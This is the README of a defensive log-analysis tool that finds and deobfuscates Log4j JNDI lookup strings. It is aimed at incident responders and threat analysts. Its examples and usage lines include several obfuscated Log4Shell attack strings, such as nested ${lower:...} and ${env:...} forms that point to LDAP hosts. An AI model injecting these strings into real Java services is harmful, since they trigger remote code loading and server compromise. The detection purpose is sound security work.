# jndi_deobfuscate.py
## Purpose
This tool processes text logs to look for Java Naming and Directory Interface (JNDI) lookup strings, and outputs deobfuscated strings when it finds them. Deobfuscated strings can be used by other tools (not included), in order to retrieve malicious payloads from an attacker. JNDI lookup strings came into spotlight during a recent series of Common Vulnerabilities and Exposures (CVEs) around a popular Java logging library, Apache Log4j. 

## Who is this for
Information Security folks, particularly people who work in incident response, red teams, blue teams, malware analysis, threat intelligence, digital forensics, reverse engineering, or other security analyst/security engineering roles.

Relevant Team Keywords: CERT, CSIRT, DFIR, SOC, RE, TI


## Why is this necessary
Generally speaking, attackers attempt to exploit recent CVEs by sending data that includes a maliciously crafted string ('attack string'), to a target system. The basic attack string is a fairly predictable format, such as `${jndi:schema://hostname:port/path}`. To avoid detection, attackers will use other JNDI Java lookup features, so that their attack strings are hidden: The previous attack string, `${jndi:schema://hostname:port/path}`, can also be rendered as `${${lower:jndi}:schema://hostname:port/path}`, in addition to a nearly unlimited number of combinations of other language features.

## Examples of processed data: 
### Example 1: Obscured Schema (lower/upper)
- Input: `${${lower:${lower:jndi}}:ld${lower:ap}://192.0.2.1}`
- Output: `${jndi:ldap//192.0.2.1}`

### Example 2: System Variables Inserted
- Input: `${$jndi://${env:hostname}.example.com/maliciouspayload}` 
- Output: `${jndi://ENV_VAR_HOSTNAME.example.com/maliciouspayload}`

### Example 3: Obscured Schema (Unresolved Variables) 
- Input: `${jn${env:ENV_NAME:-d}i${env:ENV_NAME:-:}${env:ENV_NAME:-l}d${env:ENV_NAME:-a}p${env:ENV_NAME:-:}//192.0.2.1}:8081/malware}`
- OUtput: `${jndi:ldap://192.0.2.1}:8081/malware}`

### Example 4: Parsing example 1, where attack string is contained in a webserver log
- Input: `192.0.2.1 - - [30/Feb/2022:13:37:10 +0000] "GET /?p=${${lower:${lower:jndi}}:ld${lower:ap}://192.0.2.1} HTTP/2.0" 200 5316 "https://example.com/?p=${${lower:${lower:jndi}}:ld${lower:ap}://192.0.2.1}" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" "2.75"`
- Output: `${jndi:ldap//192.0.2.1}`


## Usage:
### Process a text file for obfuscated JNDI strings:
`./jndi_deobfuscate.py -f FILENAME_HERE.txt`

### Process a single string:
`./jndi_deobfuscate.py -s '${${lower:${lower:jndi}}:ld${lower:ap}://1.2.3.4:1389/t}'`

### To view debug information, add the -v flag
`./jndi_deobfuscate.py -v -s '${${lower:${lower:jndi}}:ld${lower:ap}://1.2.3.4:1389/t}'`


## References:
- [Apache Blog entry, discussing recent CVEs](https://blogs.apache.org/foundation/entry/apache-log4j-cves)
- [Microsoft Security Blog, on detecting attacks](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)
- [Florian Roth GitHub Gist, on detecting attacks](https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b)
- [Apache Documentation on Lookup Strings](https://logging.apache.org/log4j/log4j-2.3/manual/lookups.html)


## Known Issues:
### Only processes the first JNDI string identified, per line. 
 - Input: `${jndi:ldap://example.com/1} some text ${jndi:ldap://example.com/2}`
 - Output: `${jndi:ldap://example.com/1}`

### Unit Tests Lacking
 - Need more real-world samples
 - Need more tests for each individual component of processing
 - Need to test for exhaustive recursion (current samples take ~1-3 rounds of processing. Would like items in the 20+ range, to ensure correctness.)
 - Regexs can be complex: Need unit tests on each regular expression.

### Code is slow
 - Optimization Possibilities:
     - skipping recursion where not necessary
     - more effective regexs, instead of adding code/loops to make up for loose regex matching (note: add test cases before tightening regexs)
     - more/better parallelization

### Code needs more error checking
 - Take into account defensive programming principles
 - Take into account adversary abuse
     - Can an attacker exhaust your resources, if they know you are running this?
     - Can an attacker block follow-on requests, when the attacker can tell that an obfuscated JNDI string has been processed by this script?

### Code needs better documentation
 - Better describe inputs/outputs of each method
 - Describe why/why not each code path is taken